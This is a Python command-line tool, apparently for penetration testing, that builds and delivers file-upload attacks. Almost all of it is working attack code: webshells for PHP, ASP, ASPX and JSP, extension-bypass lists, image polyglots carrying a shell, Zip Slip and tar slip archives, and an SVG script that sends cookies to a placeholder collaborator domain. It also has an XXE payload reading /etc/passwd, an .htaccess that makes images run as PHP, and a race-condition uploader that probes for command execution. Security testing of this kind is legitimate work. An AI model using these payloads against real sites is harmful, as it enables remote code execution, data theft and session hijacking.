#!/usr/bin/env python3
"""
file_upload_helper.py — File Upload Vulnerability Testing Helper

Usage:
    python3 file_upload_helper.py webshell php
    python3 file_upload_helper.py extensions
    python3 file_upload_helper.py magic-bytes php jpeg
    python3 file_upload_helper.py polyglot gif shell.php
    python3 file_upload_helper.py zipslip /var/www/html/shell.php
    python3 file_upload_helper.py svg xss
    python3 file_upload_helper.py svg xxe /etc/passwd
    python3 file_upload_helper.py htaccess
    python3 file_upload_helper.py race https://target.com/upload TOKEN
"""
import sys, os, zipfile, tarfile, io, struct

# ── Webshells ──────────────────────────────────────────────────────────────

WEBSHELLS = {
    "php":  b'<?php system($_GET["cmd"]); ?>',
    "php2": b'<?php echo shell_exec($_REQUEST["c"]); ?>',
    "php3": b'<?php @$_=`$_GET[0]`;echo $_;?>',
    "php4": b'<?php $f="sys"."tem";$f($_GET[0]); ?>',
    "php5": b'<?= system($_GET[0]) ?>',
    "asp":  b'<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>',
    "aspx": b'<%@ Page Language="C#" %><% var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>',
    "jsp":  b'<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null){out.println(l);} %>',
}

EXT_MAP = {
    "php":  ["php","php2","php3","php4","php5","php6","php7","phtml","phar","phps","PHP","PhP","pHp"],
    "asp":  ["asp","asa","cer","cdx","aspx","ashx","asmx","shtml"],
    "jsp":  ["jsp","jspx","jsw","jsv","jspf","jtml"],
    "cf":   ["cfm","cfml","cfc"],
    "perl": ["pl","pm","cgi"],
}

MAGIC_BYTES = {
    "jpeg": b'\xFF\xD8\xFF\xE0',
    "png":  b'\x89PNG\r\n\x1a\n',
    "gif":  b'GIF89a',
    "pdf":  b'%PDF-1.4',
    "zip":  b'PK\x03\x04',
    "bmp":  b'BM',
    "webp": b'RIFF',
}

def show_webshell(lang):
    lang = lang.lower()
    shells = {k: v for k, v in WEBSHELLS.items() if k.startswith(lang)}
    if not shells:
        print(f"[!] Unknown lang. Available: {', '.join(WEBSHELLS.keys())}")
        return
    print(f"\n[+] Webshells for {lang}:\n")
    for name, code in shells.items():
        print(f"  [{name}]  {code.decode()}\n")
    print("  Usage after upload:")
    if lang == "php":
        print("  curl 'https://target.com/uploads/shell.php?cmd=id'")
        print("  curl 'https://target.com/uploads/shell.php?cmd=cat+/etc/passwd'")
        print("  curl 'https://target.com/uploads/shell.php' -d 'c=id' -X POST  (shell php2)")
    print()

def show_extensions(lang=None):
    print("\n[+] Extension Bypass Wordlist:\n")
    targets = [lang] if lang and lang in EXT_MAP else list(EXT_MAP.keys())
    for t in targets:
        print(f"  === {t.upper()} ===")
        for ext in EXT_MAP[t]:
            print(f"  shell.{ext}")
        print(f"  shell.{t}.jpg   shell.{t}.png   shell.jpg.{t}")
        print(f"  shell.{t}%00.jpg   shell.{t};.jpg   shell.{t}:.jpg")
        print()
    print("  Special config files:")
    print("  .htaccess  (Apache — add: AddType application/x-httpd-php .jpg)")
    print("  web.config (IIS — enable ASP execution)")
    print()

def make_magic_bytes(lang, img_format):
    lang = lang.lower()
    img_format = img_format.lower()
    if lang not in WEBSHELLS:
        print(f"[!] Unknown lang: {lang}"); return
    if img_format not in MAGIC_BYTES:
        print(f"[!] Unknown format. Available: {', '.join(MAGIC_BYTES.keys())}"); return

    magic  = MAGIC_BYTES[img_format]
    shell  = WEBSHELLS[lang]
    output_name = f"shell_{img_format}.{lang}"
    data   = magic + b"\n" + shell

    with open(output_name, "wb") as f:
        f.write(data)

    print(f"\n[+] Created: {output_name}")
    print(f"  Magic bytes : {magic[:6]} ({img_format})")
    print(f"  Webshell    : {shell.decode()[:60]}")
    print(f"  Total size  : {len(data)} bytes")
    print(f"  Verify: file {output_name}")
    print(f"  Upload as  : {output_name}")
    print(f"  Access via : https://target.com/uploads/{output_name}?cmd=id\n")

def make_polyglot_gif(output_name="polyglot.gif.php"):
    gif_header = (
        b'GIF89a\x01\x00\x01\x00\x00\xff\x00,'
        b'\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;'
    )
    shell = b'\n<?php system($_GET["cmd"]); ?>'
    data  = gif_header + shell

    with open(output_name, "wb") as f:
        f.write(data)
    print(f"\n[+] GIF+PHP Polyglot: {output_name}")
    print(f"  First bytes : GIF89a  (valid GIF magic)")
    print(f"  PHP payload : {shell.strip().decode()}")
    print(f"  file {output_name} → should say 'GIF data'")
    print(f"  Upload and access: /uploads/{output_name}?cmd=id\n")

def make_zipslip(target_path, shell_content=None):
    if shell_content is None:
        shell_content = b'<?php system($_GET["cmd"]); ?>'
    out = "zipslip.zip"
    with zipfile.ZipFile(out, "w") as z:
        info = zipfile.ZipInfo(target_path)
        z.writestr(info, shell_content)
    print(f"\n[+] Zip Slip archive: {out}")
    print(f"  Entry path  : {target_path}")
    print(f"  Payload     : {shell_content.decode()[:60]}")
    print(f"  Upload this ZIP to any extract endpoint")
    print(f"  Shell lands at: {target_path}\n")

    # Also create tar.gz version
    out_tar = "tarslip.tar.gz"
    with tarfile.open(out_tar, "w:gz") as t:
        info = tarfile.TarInfo(name=target_path)
        info.size = len(shell_content)
        t.addfile(info, io.BytesIO(shell_content))
    print(f"[+] Tar Slip archive : {out_tar}")
    print(f"  Upload to any tar/gz extract endpoint\n")

def make_svg(mode, arg=None):
    if mode == "xss":
        svg = b"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="50" fill="blue"/>
  <script type="text/javascript">
    fetch('https://YOUR-OAST-DOMAIN/?c='+btoa(document.cookie));
    alert(document.domain);
  </script>
</svg>"""
        fname = "xss_payload.svg"
        with open(fname, "wb") as f: f.write(svg)
        print(f"\n[+] SVG XSS payload: {fname}")
        print("  Upload as avatar/image — if rendered inline → XSS fires")
        print("  Replace YOUR-OAST-DOMAIN with your Burp Collaborator / interactsh\n")

    elif mode == "xxe":
        filepath = arg or "/etc/passwd"
        svg = f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "{filepath}"> ]>
<svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="12" x="0" y="16">&xxe;</text>
</svg>""".encode()
        fname = "xxe_payload.svg"
        with open(fname, "wb") as f: f.write(svg)
        print(f"\n[+] SVG XXE payload: {fname}")
        print(f"  Target file : {filepath}")
        print(f"  Upload and view — if server renders SVG server-side → file contents in image\n")

def make_htaccess():
    content = b'AddType application/x-httpd-php .jpg .jpeg .png .gif\nOptions +ExecCGI\n'
    with open(".htaccess", "wb") as f: f.write(content)
    print("\n[+] .htaccess payload created")
    print("  Content: AddType application/x-httpd-php .jpg .jpeg .png .gif")
    print("  Upload to upload directory — then any .jpg file executes as PHP")
    print("  After uploading .htaccess, upload: shell.jpg with PHP content\n")

def race_condition(url, token):
    import threading, urllib.request
    print(f"\n[+] Race Condition Upload Test: {url}\n")
    print("  Uploading PHP shell + immediately probing for execution...\n")

    shell_content = b'<?php system($_GET["cmd"]); ?>'
    boundary = "----TestBoundary"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
        f"Content-Type: image/jpeg\r\n\r\n"
    ).encode() + shell_content + f"\r\n--{boundary}--\r\n".encode()

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Cookie": f"session={token}",
        "Content-Length": str(len(body)),
    }

    results = []
    def upload():
        try:
            req = urllib.request.Request(url, body, headers)
            with urllib.request.urlopen(req, timeout=10) as r:
                results.append(("upload", r.status, r.read(200).decode("utf-8","ignore")))
        except Exception as e:
            results.append(("upload", 0, str(e)))

    # Guess upload path
    base = url.rsplit("/upload",1)[0]
    probe_urls = [
        f"{base}/uploads/shell.php?cmd=id",
        f"{base}/files/shell.php?cmd=id",
        f"{base}/media/shell.php?cmd=id",
        f"{base}/static/shell.php?cmd=id",
    ]

    t_up = threading.Thread(target=upload)
    t_up.start()

    import time
    for _ in range(30):
        for pu in probe_urls:
            try:
                with urllib.request.urlopen(pu, timeout=1) as r:
                    body_r = r.read(200).decode("utf-8","ignore")
                    if "uid=" in body_r:
                        print(f"  [!!!] RACE WON! Shell executed at: {pu}")
                        print(f"  Output: {body_r}")
                        return
            except:
                pass

    t_up.join()
    print("  Race not won in this attempt — retry or increase iterations\n")

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__); sys.exit(0)
    cmd = args[0]
    if cmd == "webshell":
        show_webshell(args[1] if len(args)>1 else "php")
    elif cmd == "extensions":
        show_extensions(args[1] if len(args)>1 else None)
    elif cmd == "magic-bytes":
        lang = args[1] if len(args)>1 else "php"
        fmt  = args[2] if len(args)>2 else "jpeg"
        make_magic_bytes(lang, fmt)
    elif cmd == "polyglot":
        fmt  = args[1] if len(args)>1 else "gif"
        out  = args[2] if len(args)>2 else f"polyglot.{fmt}.php"
        if fmt == "gif":
            make_polyglot_gif(out)
        else:
            print("[!] Currently supported: gif")
    elif cmd == "zipslip":
        path = args[1] if len(args)>1 else "../../var/www/html/shell.php"
        make_zipslip(path)
    elif cmd == "svg":
        mode = args[1] if len(args)>1 else "xss"
        arg  = args[2] if len(args)>2 else None
        make_svg(mode, arg)
    elif cmd == "htaccess":
        make_htaccess()
    elif cmd == "race":
        url   = args[1] if len(args)>1 else "https://target.com/upload"
        token = args[2] if len(args)>2 else "YOUR-SESSION-TOKEN"
        race_condition(url, token)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
